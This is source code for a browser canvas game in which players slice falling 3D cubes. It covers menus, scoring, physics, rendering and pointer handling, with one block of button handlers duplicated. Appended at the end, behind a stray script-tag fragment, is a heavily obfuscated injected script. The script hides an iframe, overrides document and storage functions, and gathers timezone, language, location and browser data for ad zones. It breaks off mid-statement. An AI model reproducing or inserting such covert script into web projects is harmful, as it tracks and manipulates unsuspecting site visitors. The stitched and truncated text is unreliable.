				highScoreLblNode.textContent = 'New High Score!';
			} else {
				highScoreLblNode.textContent = `High Score: ${formatNumber(getHighScore())}`;
			}
			showMenu(menuScoreNode);
			break;
	}

	setHudVisibility(!isMenuVisible());
	menuContainerNode.classList.toggle('has-active', isMenuVisible());
	menuContainerNode.classList.toggle('interactive-mode', isMenuVisible() && pointerIsDown);
}

renderMenus();



////////////////////
// Button Actions //
////////////////////

// Main Menu
handleClick($('.play-normal-btn'), () => {
	setGameMode(GAME_MODE_RANKED);
	setActiveMenu(null);
	resetGame();
});

handleClick($('.play-casual-btn'), () => {
	setGameMode(GAME_MODE_CASUAL);
	setActiveMenu(null);
	resetGame();
});

// Pause Menu
handleClick($('.resume-btn'), () => resumeGame());
handleClick($('.menu-btn--pause'), () => setActiveMenu(MENU_MAIN));

// Score Menu
handleClick($('.play-again-btn'), () => {
	setActiveMenu(null);
	resetGame();
});

handleClick($('.menu-btn--score'), () => setActiveMenu(MENU_MAIN));




////////////////////
// Button Actions //
////////////////////

// Main Menu
handleClick($('.play-normal-btn'), () => {
	setGameMode(GAME_MODE_RANKED);
	setActiveMenu(null);
	resetGame();
});

handleClick($('.play-casual-btn'), () => {
	setGameMode(GAME_MODE_CASUAL);
	setActiveMenu(null);
	resetGame();
});

// Pause Menu
handleClick($('.resume-btn'), () => resumeGame());
handleClick($('.menu-btn--pause'), () => setActiveMenu(MENU_MAIN));

// Score Menu
handleClick($('.play-again-btn'), () => {
	setActiveMenu(null);
	resetGame();
});

handleClick($('.menu-btn--score'), () => setActiveMenu(MENU_MAIN));





// actions.js
// ============================================================================
// ============================================================================

//////////////////
// MENU ACTIONS //
//////////////////

function setActiveMenu(menu) {
	state.menus.active = menu;
	renderMenus();
}


/////////////////
// HUD ACTIONS //
/////////////////

function setScore(score) {
	state.game.score = score;
	renderScoreHud();
}

function incrementScore(inc) {
	if (isInGame()) {
		state.game.score += inc;
		if (state.game.score < 0) {
			state.game.score = 0;
		}
		renderScoreHud();
	}
}

function setCubeCount(count) {
	state.game.cubeCount = count;
	renderScoreHud();
}

function incrementCubeCount(inc) {
	if (isInGame()) {
		state.game.cubeCount += inc;
		renderScoreHud();
	}
}


//////////////////
// GAME ACTIONS //
//////////////////

function setGameMode(mode) {
	state.game.mode = mode;
}

function resetGame() {
	resetAllTargets();
	state.game.time = 0;
	resetAllCooldowns();
	setScore(0);
	setCubeCount(0);
	spawnTime = getSpawnDelay();
}

function pauseGame() {
	isInGame() && setActiveMenu(MENU_PAUSE);
}

function resumeGame() {
	isPaused() && setActiveMenu(null);
}

function endGame() {
	handleCanvasPointerUp();
	if (isNewHighScore()) {
		setHighScore(state.game.score);
	}
	setActiveMenu(MENU_SCORE);
}



////////////////////////
// KEYBOARD SHORTCUTS //
////////////////////////

window.addEventListener('keydown', event => {
	if (event.key === 'p') {
		isPaused() ? resumeGame() : pauseGame();
	}
});






// tick.js
// ============================================================================
// ============================================================================


let spawnTime = 0;
const maxSpawnX = 450;
const pointerDelta = { x: 0, y: 0 };
const pointerDeltaScaled = { x: 0, y: 0 };

// Temp slowmo state. Should be relocated once this stabilizes.
const slowmoDuration = 1500;
let slowmoRemaining = 0;
let spawnExtra = 0;
const spawnExtraDelay = 300;
let targetSpeed = 1;


function tick(width, height, simTime, simSpeed, lag) {
	PERF_START('frame');
	PERF_START('tick');

	state.game.time += simTime;

	if (slowmoRemaining > 0) {
		slowmoRemaining -= simTime;
		if (slowmoRemaining < 0) {
			slowmoRemaining = 0;
		}
		targetSpeed = pointerIsDown ? 0.075 : 0.3;
	} else {
		const menuPointerDown = isMenuVisible() && pointerIsDown;
		targetSpeed = menuPointerDown ? 0.025 : 1;
	}

	renderSlowmoStatus(slowmoRemaining / slowmoDuration);

	gameSpeed += (targetSpeed - gameSpeed) / 22 * lag;
	gameSpeed = clamp(gameSpeed, 0, 1);

	const centerX = width / 2;
	const centerY = height / 2;

	const simAirDrag = 1 - (airDrag * simSpeed);
	const simAirDragSpark = 1 - (airDragSpark * simSpeed);

	// Pointer Tracking
	// -------------------

	// Compute speed and x/y deltas.
	// There is also a "scaled" variant taking game speed into account. This serves two purposes:
	//  - Lag won't create large spikes in speed/deltas
	//  - In slow mo, speed is increased proportionately to match "reality". Without this boost,
	//    it feels like your actions are dampened in slow mo.
	const forceMultiplier = 1 / (simSpeed * 0.75 + 0.25);
	pointerDelta.x = 0;
	pointerDelta.y = 0;
	pointerDeltaScaled.x = 0;
	pointerDeltaScaled.y = 0;
	const lastPointer = touchPoints[touchPoints.length - 1];

	if (pointerIsDown && lastPointer && !lastPointer.touchBreak) {
		pointerDelta.x = (pointerScene.x - lastPointer.x);
		pointerDelta.y = (pointerScene.y - lastPointer.y);
		pointerDeltaScaled.x = pointerDelta.x * forceMultiplier;
		pointerDeltaScaled.y = pointerDelta.y * forceMultiplier;
	}
	const pointerSpeed = Math.hypot(pointerDelta.x, pointerDelta.y);
	const pointerSpeedScaled = pointerSpeed * forceMultiplier;

	// Track points for later calculations, including drawing trail.
	touchPoints.forEach(p => p.life -= simTime);

	if (pointerIsDown) {
		touchPoints.push({
			x: pointerScene.x,
			y: pointerScene.y,
			life: touchPointLife
		});
	}

	while (touchPoints[0] && touchPoints[0].life <= 0) {
		touchPoints.shift();
	}


	// Entity Manipulation
	// --------------------
	PERF_START('entities');

	// Spawn targets
	spawnTime -= simTime;
	if (spawnTime <= 0) {
		if (spawnExtra > 0) {
			spawnExtra--;
			spawnTime = spawnExtraDelay;
		} else {
			spawnTime = getSpawnDelay();
		}
		const target = getTarget();
		const spawnRadius = Math.min(centerX * 0.8, maxSpawnX);
		target.x = (Math.random() * spawnRadius * 2 - spawnRadius);
		target.y = centerY + targetHitRadius * 2;
		target.z = (Math.random() * targetRadius*2 - targetRadius);
		target.xD = Math.random() * (target.x * -2 / 120);
		target.yD = -20;
		targets.push(target);
	}

	// Animate targets and remove when offscreen
	const leftBound = -centerX + targetRadius;
	const rightBound = centerX - targetRadius;
	const ceiling = -centerY - 120;
	const boundDamping = 0.4;

	targetLoop:
	for (let i = targets.length - 1; i >= 0; i--) {
		const target = targets[i];
		target.x += target.xD * simSpeed;
		target.y += target.yD * simSpeed;

		if (target.y < ceiling) {
			target.y = ceiling;
			target.yD = 0;
		}

		if (target.x < leftBound) {
			target.x = leftBound;
			target.xD *= -boundDamping;
		} else if (target.x > rightBound) {
			target.x = rightBound;
			target.xD *= -boundDamping;
		}

		if (target.z < backboardZ) {
			target.z = backboardZ;
			target.zD *= -boundDamping;
		}

		target.yD += gravity * simSpeed;
		target.rotateX += target.rotateXD * simSpeed;
		target.rotateY += target.rotateYD * simSpeed;
		target.rotateZ += target.rotateZD * simSpeed;
		target.transform();
		target.project();

		// Remove if offscreen
		if (target.y > centerY + targetHitRadius * 2) {
			targets.splice(i, 1);
			returnTarget(target);
			if (isInGame()) {
				if (isCasualGame()) {
					incrementScore(-25);
				} else {
					endGame();
				}
			}
			continue;
		}


		// If pointer is moving really fast, we want to hittest multiple points along the path.
		// We can't use scaled pointer speed to determine this, since we care about actual screen
		// distance covered.
		const hitTestCount = Math.ceil(pointerSpeed / targetRadius * 2);
		// Start loop at `1` and use `<=` check, so we skip 0% and end up at 100%.
		// This omits the previous point position, and includes the most recent.
		for (let ii=1; ii<=hitTestCount; ii++) {
			const percent = 1 - (ii / hitTestCount);
			const hitX = pointerScene.x - pointerDelta.x * percent;
			const hitY = pointerScene.y - pointerDelta.y * percent;
			const distance = Math.hypot(
				hitX - target.projected.x,
				hitY - target.projected.y
			);

			if (distance <= targetHitRadius) {
				// Hit! (though we don't want to allow hits on multiple sequential frames)
				if (!target.hit) {
					target.hit = true;

					target.xD += pointerDeltaScaled.x * hitDampening;
					target.yD += pointerDeltaScaled.y * hitDampening;
					target.rotateXD += pointerDeltaScaled.y * 0.001;
					target.rotateYD += pointerDeltaScaled.x * 0.001;

					const sparkSpeed = 7 + pointerSpeedScaled * 0.125;

					if (pointerSpeedScaled > minPointerSpeed) {
						target.health--;
						incrementScore(10);

						if (target.health <= 0) {
							incrementCubeCount(1);
							createBurst(target, forceMultiplier);
							sparkBurst(hitX, hitY, 8, sparkSpeed);
							if (target.wireframe) {
								slowmoRemaining = slowmoDuration;
								spawnTime = 0;
								spawnExtra = 2;
							}
							targets.splice(i, 1);
							returnTarget(target);
						} else {
							sparkBurst(hitX, hitY, 8, sparkSpeed);
							glueShedSparks(target);
							updateTargetHealth(target, 0);
						}
					} else {
						incrementScore(5);
						sparkBurst(hitX, hitY, 3, sparkSpeed);
					}
				}
				// Break the current loop and continue the outer loop.
				// This skips to processing the next target.
				continue targetLoop;
			}
		}

		// This code will only run if target hasn't been "hit".
		target.hit = false;
	}

	// Animate fragments and remove when offscreen.
	const fragBackboardZ = backboardZ + fragRadius;
	// Allow fragments to move off-screen to sides for a while, since shadows are still visible.
	const fragLeftBound = -width;
	const fragRightBound = width;

	for (let i = frags.length - 1; i >= 0; i--) {
		const frag = frags[i];
		frag.x += frag.xD * simSpeed;
		frag.y += frag.yD * simSpeed;
		frag.z += frag.zD * simSpeed;

		frag.xD *= simAirDrag;
		frag.yD *= simAirDrag;
		frag.zD *= simAirDrag;

		if (frag.y < ceiling) {
			frag.y = ceiling;
			frag.yD = 0;
		}

		if (frag.z < fragBackboardZ) {
			frag.z = fragBackboardZ;
			frag.zD *= -boundDamping;
		}

		frag.yD += gravity * simSpeed;
		frag.rotateX += frag.rotateXD * simSpeed;
		frag.rotateY += frag.rotateYD * simSpeed;
		frag.rotateZ += frag.rotateZD * simSpeed;
		frag.transform();
		frag.project();

		// Removal conditions
		if (
			// Bottom of screen
			frag.projected.y > centerY + targetHitRadius ||
			// Sides of screen
			frag.projected.x < fragLeftBound ||
			frag.projected.x > fragRightBound ||
			// Too close to camera
			frag.z > cameraFadeEndZ
		) {
			frags.splice(i, 1);
			returnFrag(frag);
			continue;
		}
	}

	// 2D sparks
	for (let i = sparks.length - 1; i >= 0; i--) {
		const spark = sparks[i];
		spark.life -= simTime;
		if (spark.life <= 0) {
			sparks.splice(i, 1);
			returnSpark(spark);
			continue;
		}
		spark.x += spark.xD * simSpeed;
		spark.y += spark.yD * simSpeed;
		spark.xD *= simAirDragSpark;
		spark.yD *= simAirDragSpark;
		spark.yD += gravity * simSpeed;
	}

	PERF_END('entities');

	// 3D transforms
	// -------------------

	PERF_START('3D');

	// Aggregate all scene vertices/polys
	allVertices.length = 0;
	allPolys.length = 0;
	allShadowVertices.length = 0;
	allShadowPolys.length = 0;
	targets.forEach(entity => {
		allVertices.push(...entity.vertices);
		allPolys.push(...entity.polys);
		allShadowVertices.push(...entity.shadowVertices);
		allShadowPolys.push(...entity.shadowPolys);
	});

	frags.forEach(entity => {
		allVertices.push(...entity.vertices);
		allPolys.push(...entity.polys);
		allShadowVertices.push(...entity.shadowVertices);
		allShadowPolys.push(...entity.shadowPolys);
	});

	// Scene calculations/transformations
	allPolys.forEach(p => computePolyNormal(p, 'normalWorld'));
	allPolys.forEach(computePolyDepth);
	allPolys.sort((a, b) => b.depth - a.depth);

	// Perspective projection
	allVertices.forEach(projectVertex);

	allPolys.forEach(p => computePolyNormal(p, 'normalCamera'));

	PERF_END('3D');

	PERF_START('shadows');

	// Rotate shadow vertices to light source perspective
	transformVertices(
		allShadowVertices,
		allShadowVertices,
		0, 0, 0,
		TAU/8, 0, 0,
		1, 1, 1
	);

	allShadowPolys.forEach(p => computePolyNormal(p, 'normalWorld'));

	const shadowDistanceMult = Math.hypot(1, 1);
	const shadowVerticesLength = allShadowVertices.length;
	for (let i=0; i<shadowVerticesLength; i++) {
		const distance = allVertices[i].z - backboardZ;
		allShadowVertices[i].z -= shadowDistanceMult * distance;
	}
	transformVertices(
		allShadowVertices,
		allShadowVertices,
		0, 0, 0,
		-TAU/8, 0, 0,
		1, 1, 1
	);
	allShadowVertices.forEach(projectVertex);

	PERF_END('shadows');

	PERF_END('tick');
}





// draw.js
// ============================================================================
// ============================================================================

function draw(ctx, width, height, viewScale) {
	PERF_START('draw');

	const halfW = width / 2;
	const halfH = height / 2;


	// 3D Polys
	// ---------------
	ctx.lineJoin = 'bevel';

	PERF_START('drawShadows');
	ctx.fillStyle = shadowColor;
	ctx.strokeStyle = shadowColor;
	allShadowPolys.forEach(p => {
		if (p.wireframe) {
			ctx.lineWidth = 2;
			ctx.beginPath();
			const { vertices } = p;
			const vCount = vertices.length;
			const firstV = vertices[0];
			ctx.moveTo(firstV.x, firstV.y);
			for (let i=1; i<vCount; i++) {
				const v = vertices[i];
				ctx.lineTo(v.x, v.y);
			}
			ctx.closePath();
			ctx.stroke();
		} else {
			ctx.beginPath();
			const { vertices } = p;
			const vCount = vertices.length;
			const firstV = vertices[0];
			ctx.moveTo(firstV.x, firstV.y);
			for (let i=1; i<vCount; i++) {
				const v = vertices[i];
				ctx.lineTo(v.x, v.y);
			}
			ctx.closePath();
			ctx.fill();
		}
	});
	PERF_END('drawShadows');

	PERF_START('drawPolys');

	allPolys.forEach(p => {
		if (!p.wireframe && p.normalCamera.z < 0) return;

		if (p.strokeWidth !== 0) {
			ctx.lineWidth = p.normalCamera.z < 0 ? p.strokeWidth * 0.5 : p.strokeWidth;
			ctx.strokeStyle = p.normalCamera.z < 0 ? p.strokeColorDark : p.strokeColor;
		}

		const { vertices } = p;
		const lastV = vertices[vertices.length - 1];
		const fadeOut = p.middle.z > cameraFadeStartZ;

		if (!p.wireframe) {
			const normalLight = p.normalWorld.y * 0.5 + p.normalWorld.z * -0.5;
			const lightness = normalLight > 0
				? 0.1
				: ((normalLight ** 32 - normalLight) / 2) * 0.9 + 0.1;
			ctx.fillStyle = shadeColor(p.color, lightness);
		}

		// Fade out polys close to camera. `globalAlpha` must be reset later.
		if (fadeOut) {
			// If polygon gets really close to camera (outside `cameraFadeRange`) the alpha
			// can go negative, which has the appearance of alpha = 1. So, we'll clamp it at 0.
			ctx.globalAlpha = Math.max(0, 1 - (p.middle.z - cameraFadeStartZ) / cameraFadeRange);
		}

		ctx.beginPath();
		ctx.moveTo(lastV.x, lastV.y);
		for (let v of vertices) {
			ctx.lineTo(v.x, v.y);
		}

		if (!p.wireframe) {
			ctx.fill();
		}
		if (p.strokeWidth !== 0) {
			ctx.stroke();
		}

		if (fadeOut) {
			ctx.globalAlpha = 1;
		}
	});
	PERF_END('drawPolys');


	PERF_START('draw2D');

	// 2D Sparks
	// ---------------
	ctx.strokeStyle = sparkColor;
	ctx.lineWidth = sparkThickness;
	ctx.beginPath();
	sparks.forEach(spark => {
		ctx.moveTo(spark.x, spark.y);
		// Shrink sparks to zero length as they die.
		// Speed up shrinking as life approaches 0 (root curve).
		// Note that sparks already get smaller over time as their speed slows
		// down from damping. So this is like a double scale down. To counter this
		// a bit and keep the sparks larger for longer, we'll also increase the scale
		// a bit after applying the root curve.
		const scale = (spark.life / spark.maxLife) ** 0.5 * 1.5;
		ctx.lineTo(spark.x - spark.xD*scale, spark.y - spark.yD*scale);

	});
	ctx.stroke();


	// Touch Strokes
	// ---------------

	ctx.strokeStyle = touchTrailColor;
	const touchPointCount = touchPoints.length;
	for (let i=1; i<touchPointCount; i++) {
		const current = touchPoints[i];
		const prev = touchPoints[i-1];
		if (current.touchBreak || prev.touchBreak) {
			continue;
		}
		const scale = current.life / touchPointLife;
		ctx.lineWidth = scale * touchTrailThickness;
		ctx.beginPath();
		ctx.moveTo(prev.x, prev.y);
		ctx.lineTo(current.x, current.y);
		ctx.stroke();
	}

	PERF_END('draw2D');

	PERF_END('draw');
	PERF_END('frame');

	// Display performance updates.
	PERF_UPDATE();
}





// canvas.js
// ============================================================================
// ============================================================================

function setupCanvases() {
	const ctx = canvas.getContext('2d');
	// devicePixelRatio alias
	const dpr = window.devicePixelRatio || 1;
	// View will be scaled so objects appear sized similarly on all screen sizes.
	let viewScale;
	// Dimensions (taking viewScale into account!)
	let width, height;

	function handleResize() {
		const w = window.innerWidth;
		const h = window.innerHeight;
		viewScale = h / 1000;
		width = w / viewScale;
		height = h / viewScale;
		canvas.width = w * dpr;
		canvas.height = h * dpr;
		canvas.style.width = w + 'px';
		canvas.style.height = h + 'px';
	}

	// Set initial size
	handleResize();
	// resize fullscreen canvas
	window.addEventListener('resize', handleResize);


	// Run game loop
	let lastTimestamp = 0;
	function frameHandler(timestamp) {
		let frameTime = timestamp - lastTimestamp;
		lastTimestamp = timestamp;

		// always queue another frame
		raf();

		// If game is paused, we'll still track frameTime (above) but all other
		// game logic and drawing can be avoided.
		if (isPaused()) return;

		// make sure negative time isn't reported (first frame can be whacky)
		if (frameTime < 0) {
			frameTime = 17;
		}
		// - cap minimum framerate to 15fps[~68ms] (assuming 60fps[~17ms] as 'normal')
		else if (frameTime > 68) {
			frameTime = 68;
		}

		const halfW = width / 2;
		const halfH = height / 2;

		// Convert pointer position from screen to scene coords.
		pointerScene.x = pointerScreen.x / viewScale - halfW;
		pointerScene.y = pointerScreen.y / viewScale - halfH;

		const lag = frameTime / 16.6667;
		const simTime = gameSpeed * frameTime;
		const simSpeed = gameSpeed * lag;
		tick(width, height, simTime, simSpeed, lag);

		// Auto clear canvas
		ctx.clearRect(0, 0, canvas.width, canvas.height);
		// Auto scale drawing for high res displays, and incorporate `viewScale`.
		// Also shift canvas so (0, 0) is the middle of the screen.
		// This just works with 3D perspective projection.
		const drawScale = dpr * viewScale;
		ctx.scale(drawScale, drawScale);
		ctx.translate(halfW, halfH);
		draw(ctx, width, height, viewScale);
		ctx.setTransform(1, 0, 0, 1, 0, 0);
	}
	const raf = () => requestAnimationFrame(frameHandler);
	// Start loop
	raf();
}





// interaction.js
// ============================================================================
// ============================================================================

// Interaction
// -----------------------------

function handleCanvasPointerDown(x, y) {
	if (!pointerIsDown) {
		pointerIsDown = true;
		pointerScreen.x = x;
		pointerScreen.y = y;
		// On when menus are open, point down/up toggles an interactive mode.
		// We just need to rerender the menu system for it to respond.
		if (isMenuVisible()) renderMenus();
	}
}

function handleCanvasPointerUp() {
	if (pointerIsDown) {
		pointerIsDown = false;
		touchPoints.push({
			touchBreak: true,
			life: touchPointLife
		});
		// On when menus are open, point down/up toggles an interactive mode.
		// We just need to rerender the menu system for it to respond.
		if (isMenuVisible()) renderMenus();
	}
}

function handleCanvasPointerMove(x, y) {
	if (pointerIsDown) {
		pointerScreen.x = x;
		pointerScreen.y = y;
	}
}


// Use pointer events if available, otherwise fallback to touch events (for iOS).
if ('PointerEvent' in window) {
	canvas.addEventListener('pointerdown', event => {
		event.isPrimary && handleCanvasPointerDown(event.clientX, event.clientY);
	});

	canvas.addEventListener('pointerup', event => {
		event.isPrimary && handleCanvasPointerUp();
	});

	canvas.addEventListener('pointermove', event => {
		event.isPrimary && handleCanvasPointerMove(event.clientX, event.clientY);
	});

	// We also need to know if the mouse leaves the page. For this game, it's best if that
	// cancels a swipe, so essentially acts as a "mouseup" event.
	document.body.addEventListener('mouseleave', handleCanvasPointerUp);
} else {
	let activeTouchId = null;
	canvas.addEventListener('touchstart', event => {
		if (!pointerIsDown) {
			const touch = event.changedTouches[0];
			activeTouchId = touch.identifier;
			handleCanvasPointerDown(touch.clientX, touch.clientY);
		}
	});
	canvas.addEventListener('touchend', event => {
		for (let touch of event.changedTouches) {
			if (touch.identifier === activeTouchId) {
				handleCanvasPointerUp();
				break;
			}
		}
	});
	canvas.addEventListener('touchmove', event => {
		for (let touch of event.changedTouches) {
			if (touch.identifier === activeTouchId) {
				handleCanvasPointerMove(touch.clientX, touch.clientY);
				event.preventDefault();
				break;
			}
		}
	}, { passive: false });
}
data-cfasync="false" type="text/javascript">(()=>{var K='ChmaorrCfozdgenziMrattShzzyrtarnedpoomrzPteonSitfreidnzgtzcseljibcOezzerlebpalraucgeizfznfoocrzEwaocdhnziaWptpnleytzngoectzzdclriehaCtdenTeepxptaNzoldmetzhRzeegvEoxmpezraztdolbizhXCGtIs=rzicfozn>ceamtazr(fdio/c<u>m"eennto)nz:gyzaclaplslizdl"o=ceallySttso r"akgneazl_bd:attuaozbsae"t=Ictresm zegmeatrIftie<mzzLrMeTmHorveenIntiezmezdcolNeeanrozldcezcdoadeehUzReIdCooNmtpnoenreanptzzebnionndzzybatlopasziedvzaellzyJtSsOzNezmDaartfeizzAtrnreamyuzcPordozmyidsoebzzpeatrasteSIyndtazenrazvtipgiartcoSrtzneenrcroudcezUeRmIazNUgianTty8BAsrtrnaeymzesleEttTeigmzedoIuytBztsneetmIenltEetrevgazlSzNAtrnreamyeBluEfeftearezrcclzetanreTmigmaeroFuttnzecmluecaorDIenttaeerrvcazltznMeevsEshacgteaCphsaindnzelllzABrrootacdeclaesStyCrheaunqnzerloztecnecloedSeyUrReIuCqozmrpeonneetnstizLTtynpeevEErervoormzeErvzernetnzeEtrsrioLrtznIemvaEgdedzaszetsnseimoenlSEteotraaegrec'.split("").reduce((v,g,L)=>L%2?v+g:g+v).split("z");(v=>{let g=[K[0],K[1],K[2],K[3],K[4],K[5],K[6],K[7],K[8],K[9]],L=[K[10],K[11],K[12]],R=document,U,s,c=window,C={};try{try{U=window[K[13]][K[0]](K[14]),U[K[15]][K[16]]=K[17]}catch(a){s=(R[K[10]]?R[K[10]][K[18]]:R[K[12]]||R[K[19]])[K[20]](),s[K[21]]=K[22],U=s[K[23]]}U[K[24]]=()=>{},R[K[9]](K[25])[0][K[26]](U),c=U[K[27]];let _={};_[K[28]]=!1,c[K[29]][K[30]](c[K[31]],K[32],_);let S=c[K[33]][K[34]]()[K[35]](36)[K[36]](2)[K[37]](/^\d+/,K[38]);window[S]=document,g[K[39]](a=>{document[a]=function(){return c[K[13]][a][K[40]](window[K[13]],arguments)}}),L[K[39]](a=>{let h={};h[K[28]]=!1,h[K[41]]=()=>R[a],c[K[29]][K[30]](C,a,h)}),document[K[42]]=function(){let a=new c[K[43]](c[K[44]](K[45])[K[46]](K[47],c[K[44]](K[45])),K[48]);return arguments[0]=arguments[0][K[37]](a,S),c[K[13]][K[42]][K[49]](window[K[13]],arguments[0])};try{window[K[50]]=window[K[50]]}catch(a){let h={};h[K[51]]={},h[K[52]]=(B,ve)=>(h[K[51]][B]=c[K[31]](ve),h[K[51]][B]),h[K[53]]=B=>{if(B in h[K[51]])return h[K[51]][B]},h[K[54]]=B=>(delete h[K[51]][B],!0),h[K[55]]=()=>(h[K[51]]={},!0),delete window[K[50]],window[K[50]]=h}try{window[K[44]]}catch(a){delete window[K[44]],window[K[44]]=c[K[44]]}try{window[K[56]]}catch(a){delete window[K[56]],window[K[56]]=c[K[56]]}try{window[K[43]]}catch(a){delete window[K[43]],window[K[43]]=c[K[43]]}for(key in document)try{C[key]=document[key][K[57]](document)}catch(a){C[key]=document[key]}}catch(_){}let z=_=>{try{return c[_]}catch(S){try{return window[_]}catch(a){return null}}};[K[31],K[44],K[58],K[59],K[60],K[61],K[33],K[62],K[43],K[63],K[63],K[64],K[65],K[66],K[67],K[68],K[69],K[70],K[71],K[72],K[73],K[74],K[56],K[75],K[29],K[76],K[77],K[78],K[79],K[50],K[80]][K[39]](_=>{try{if(!window[_])throw new c[K[78]](K[38])}catch(S){try{let a={};a[K[28]]=!1,a[K[41]]=()=>c[_],c[K[29]][K[30]](window,_,a)}catch(a){}}}),v(z(K[31]),z(K[44]),z(K[58]),z(K[59]),z(K[60]),z(K[61]),z(K[33]),z(K[62]),z(K[43]),z(K[63]),z(K[63]),z(K[64]),z(K[65]),z(K[66]),z(K[67]),z(K[68]),z(K[69]),z(K[70]),z(K[71]),z(K[72]),z(K[73]),z(K[74]),z(K[56]),z(K[75]),z(K[29]),z(K[76]),z(K[77]),z(K[78]),z(K[79]),z(K[50]),z(K[80]),C)})((v,g,L,R,U,s,c,C,z,_,S,a,h,B,ve,N,fe,rt,cn,H,lK,zn,Kt,ft,ue,yK,ut,I,ot,j,an,qt)=>{(function(e,q,i,w){(()=>{function ie(n){let t=n[e.IK]()[e.Aj](e.J);return t>=e.HK&&t<=e.rj?t-e.HK:t>=e.ej&&t<=e.tj?t-e.ej+e.LK:e.J}function bn(n){return n<=e.nK?v[e.Kj](n+e.HK):n<=e.jj?v[e.Kj](n+e.ej-e.LK):e.uK}function Mt(n,t){return n[e.Pk](e.h)[e.NK]((r,f)=>{let u=(t+e.U)*(f+e.U),o=(ie(r)+u)%e.lK;return bn(o)})[e.EK](e.h)}function _e(n,t){return n[e.Pk](e.h)[e.NK]((r,f)=>{let u=t[f%(t[e.SK]-e.U)],o=ie(u),M=ie(r)-o,d=M<e.J?M+e.lK:M;return bn(d)})[e.EK](e.h)}var dt=S,O=dt,it=e.yj(e.rK,e.KK),ct=e.yj(e.jK,e.KK),zt=e.V,at=[[e.kj],[e.Mj,e.bj,e.Ej],[e.Yj,e.Sj],[e.gj,e.Cj,e.Gj],[e.hj,e.vj]],bt=[[e.Oj],[-e.Lj],[-e.Nj],[-e.Fj,-e.qj],[e.Wj,e.Ej,-e.Oj,-e.Rj]],jt=[[e.cj],[e.pj],[e.Bj],[e.Qj],[e.Vj]];function Ce(n,t){try{let r=n[e.FK](f=>f[e.LM](t)>-e.U)[e.vM]();return n[e.LM](r)+zt}catch(r){return e.J}}function mt(n){return it[e.hK](n)?e.i:ct[e.hK](n)?e.V:e.U}function Et(n){return Ce(at,n)}function lt(n){return Ce(bt,n[e.mj]())}function yt(n){return Ce(jt,n)}function pt(n){return n[e.Pk](e.iK)[e.kK](e.U)[e.FK](t=>t)[e.vM]()[e.Pk](e.DK)[e.kK](-e.V)[e.EK](e.DK)[e.eM]()[e.Pk](e.h)[e.sK]((t,r)=>t+ie(r),e.J)%e.w+e.U}var Be=[];function xt(){return Be}function X(n){Be[e.kK](-e.U)[e.oj]()!==n&&Be[e.Hj](n)}var oe=typeof i<e.l?i[e.qr]:e.v,Ne=e.H,Te=e.n,ce=c[e.A]()[e.IK](e.lK)[e.kK](e.V),st=c[e.A]()[e.IK](e.lK)[e.kK](e.V),Fe=c[e.A]()[e.IK](e.lK)[e.kK](e.V),pK=c[e.A]()[e.IK](e.lK)[e.kK](e.V);function jn(n){oe[e.zK](Ne,jn),[mt(w[e.fr]),Et(q[e.uj][e.JK]),lt(new s),pt(q[e.nj][e.xb]),yt(w[e.yb]||w[e.Lb])][e.X](t=>{let r=a(c[e.A]()*e.LK,e.LK);N(()=>{let f=e.MK();f[e.aK]=n[e.XK],f[e.ob]=t,q[e.PK](f,e.fK),X(e.LE[e.CK](t))},r)})}function mn(n){oe[e.zK](Te,mn);let t=e.MK();t[e.aK]=n[e.XK];let{href:r}=q[e.nj],f=new q[e.Tj];f[e.Pj](e.gr,r),f[e.fj]=()=>{t[e.Nr]=f[e.bE](),q[e.PK](t,e.fK)},f[e.Rr]=()=>{t[e.Nr]=e.Fb,q[e.PK](t,e.fK)},f[e.xk]()}oe&&(oe[e.T](Ne,jn),oe[e.T](Te,mn));var ht=e.u,wt=e.z,V=e.a,ze=i[e.qr],T=[q],Jt=[],gt=()=>{};ze&&ze[e.Rr]&&(gt=ze[e.Rr]);try{let n=T[e.kK](-e.U)[e.oj]();for(;n&&n!==n[e.rk]&&n[e.rk][e.uj][e.JK];)T[e.Hj](n[e.rk]),n=n[e.rk]}catch(n){}T[e.X](n=>{n[e.Ub][e.PM][e.NM][e.aM]||(n[e.Ub][e.PM][e.NM][e.aM]=c[e.A]()[e.IK](e.lK)[e.kK](e.V));let t=n[e.Ub][e.PM][e.NM][e.aM];n[t]=n[t]||[];try{n[V]=n[V]||[]}catch(r){}});function Ut(n,t,r,f=e.J,u=e.J,o){let M;try{M=ze[e.Ek][e.Pk](e.iK)[e.V]}catch(d){}try{let d=q[e.Ub][e.PM][e.NM][e.aM]||V,b=q[d][e.FK](l=>l[e.Kk]===r&&l[e.bb])[e.vM](),p=e.MK();p[e.jk]=n,p[e.Mb]=t,p[e.Kk]=r,p[e.bb]=b?b[e.bb]:u,p[e.Eb]=M,p[e.Yb]=f,p[e.Sb]=o,o&&o[e.db]&&(p[e.db]=o[e.db]),Jt[e.Hj](p),T[e.X](l=>{let J=l[e.Ub][e.PM][e.NM][e.aM]||V;l[J][e.Hj](p);try{l[V][e.Hj](p)}catch(E){}})}catch(d){}}function Ae(n,t){let r=Pt();for(let f=e.J;f<r[e.SK];f++)if(r[f][e.Kk]===t&&r[f][e.jk]===n)return!e.J;return!e.U}function Pt(){let n=[];for(let t=e.J;t<T[e.SK];t++){let r=T[t][e.Ub][e.PM][e.NM][e.aM],f=T[t][r]||[];for(let u=e.J;u<f[e.SK];u++)n[e.FK](({format:o,zoneId:M})=>{let d=o===f[u][e.jk],b=M===f[u][e.Kk];return d&&b})[e.SK]>e.J||n[e.Hj](f[u])}try{for(let t=e.J;t<T[e.SK];t++){let r=T[t][V]||[];for(let f=e.J;f<r[e.SK];f++)n[e.FK](({format:u,zoneId:o})=>{let M=u===r[f][e.jk],d=o===r[f][e.Kk];return M&&d})[e.SK]>e.J||n[e.Hj](r[f])}}catch(t){}return n}function En(n,t){T[e.NK](r=>{let f=r[e.Ub][e.PM][e.NM][e.aM]||V;return(r[f]||[])[e.FK](u=>n[e.LM](u[e.Kk])>-e.U)})[e.sK]((r,f)=>r[e.CK](f),[])[e.X](r=>{try{r[e.Sb][e.ek](t)}catch(f){}})}var Y=e.MK();Y[e.U]=e.x,Y[e.d]=e.r,Y[e.Z]=e.K,Y[e.i]=e.j,Y[e.w]=e.k,Y[e.I]=e.M,Y[e.V]=e.b;var W=e.MK();W[e.U]=e.E,W[e.I]=e.Y,W[e.i]=e.S,W[e.V]=e.b;var k=e.MK();k[e.U]=e.g,k[e.V]=e.C,k[e.d]=e.G,k[e.Z]=e.G,k[e.i]=e.G;var 